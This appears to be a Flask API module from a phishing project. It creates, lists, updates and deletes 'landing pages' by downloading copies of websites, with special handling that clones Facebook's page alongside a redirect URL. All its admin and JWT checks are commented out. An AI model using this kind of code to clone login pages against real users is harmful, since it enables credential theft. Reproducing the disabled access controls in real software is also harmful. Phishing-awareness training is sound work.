
import re
import requests
import os
from flask import request, jsonify, make_response
from flask_restx import Resource, fields, Namespace
from flask_jwt_extended import get_jwt, jwt_required
from clone.facebook_clone import modify_html_facebook
from constans.http_status_code import (
    HTTP_200_OK,
    HTTP_201_CREATED,
    HTTP_400_BAD_REQUEST,
    HTTP_404_NOT_FOUND,
    HTTP_409_CONFLICT,
)
from api.models import Page, db

landing_page_ns = Namespace("landing_page", description="Landing Page operations")



landing_page_model = landing_page_ns.model(
    "Page",
    {
        "name": fields.String(),
        "URL": fields.String(),
        "RedirectUrl": fields.String(),
        "html": fields.String()
        }
)

def check_admin_permission():
    jwt = get_jwt()
    if jwt["role"] != "admin":
        return make_response(
            jsonify({"msg": "Permission denied"}), HTTP_400_BAD_REQUEST
        )


def validate_strip(profile_name, name):
    if profile_name.strip() == "":
        return make_response(
            jsonify({"msg": f"No {name} provided"}), HTTP_400_BAD_REQUEST
        )
        
        
def create_landing(name, url,html,directory):
    directory = directory
    file_name = f"{name}.html"
    file_path = os.path.join(directory, file_name)

    if html.strip() == "":
        res = requests.get(url)
        if res.status_code == 200:
            htmlData = res.content
            with open(file_path, "wb") as file:
                file.write(htmlData)

            return file_path
        else:
            return None
    else:
        with open(file_path, "wb") as file:
            file.write(html.encode('utf-8'))  # Assuming htmlData is already in bytes

        return file_path
                


        
        
        
@landing_page_ns.route("/")
class LandingManagments(Resource):
    # @jwt_required()
    @landing_page_ns.expect(landing_page_model)
    def post(self):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check
        data = request.get_json()
        land_name = data.get("name")
        url = data.get("url")
        redirectUrl = data.get("redirectUrl")
        html_data = data.get("html")    
        
        directory = "/Users/souliya/Desktop/Project Phishing/backend/clone/landing_page/"
        html_file = f"{land_name}.html"
        
        file_name = directory +html_file
        
        db_landing = db.session.query(Page).filter_by(path=file_name).first()
        if db_landing:
            return make_response(
                jsonify({"msg": "Landing name already taken"}), HTTP_409_CONFLICT
            )
        
        if url == "https://www.facebook.com/" or url == "https://en-gb.facebook.com/":
            file_path = modify_html_facebook(url, file_name, directory, redirectUrl)
            if file_path is None:
                return make_response(
                    jsonify({"msg": "Created failed"}), HTTP_400_BAD_REQUEST
                )
        else:        
            file_path = create_landing(land_name, url,html_data, directory)
            if file_path is None:
                return make_response(
                    jsonify({"msg": "Created failed"}), HTTP_400_BAD_REQUEST
                )
        
            
        new_landing = Page(path = file_path)
        db.session.add(new_landing)
        db.session.commit()
        
        return make_response(
            jsonify({"msg": "Landing Page Created"}), HTTP_201_CREATED
        )
        
        
    # @jwt_required()
    def get(self):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check    
        
        db_landning = db.session.query(Page).all()
        data = []
        for landing in db_landning:
            data.append(
                {   
                    "id": landing.page_id,
                    # "name": landing.landing_name,
                    "html": landing.html,
                }
            )
        
        return make_response(jsonify({"landing_page": data}), HTTP_200_OK)
    
    
@landing_page_ns.route("/<int:id>")
class LandingManagment(Resource):

    # @jwt_required()
    def delete(self, id):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check
        
        db_landing = db.session.query(Page).filter_by(page_id = id).first()
        if not db_landing:
            return make_response(
                jsonify({"msg": "Landing Page not found"}), HTTP_404_NOT_FOUND
            )
        
        file_path = db_landing.path
        os.remove(file_path)
        
            
        db.session.delete(db_landing)
        db.session.commit()
        
        return make_response(
            jsonify({"msg": "Landing Page Deleted"}), HTTP_200_OK
        )
        
    # @jwt_required()
        
    def put(self, id):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check
        
        data = request.get_json()
        land_name = data.get("name")
        URL = data.get("URL")
        RedirectUrl = data.get("RedirectUrl")
        html = data.get("html")
        
        validate_html = validate_strip(html, "html")
        if validate_html:
            return validate_html
        
        db_landing = db.session.query(Page).filter_by(page_id = id).first()
        
        if not db_landing:
            return make_response(
                jsonify({"msg": "Landing Page not found"}), HTTP_404_NOT_FOUND
            )
            
        db_landing.html = html
        
        db.session.commit()
        
        return make_response(
            jsonify({"msg": "Landing Page Updated"}), HTTP_200_OK
        )
        
        
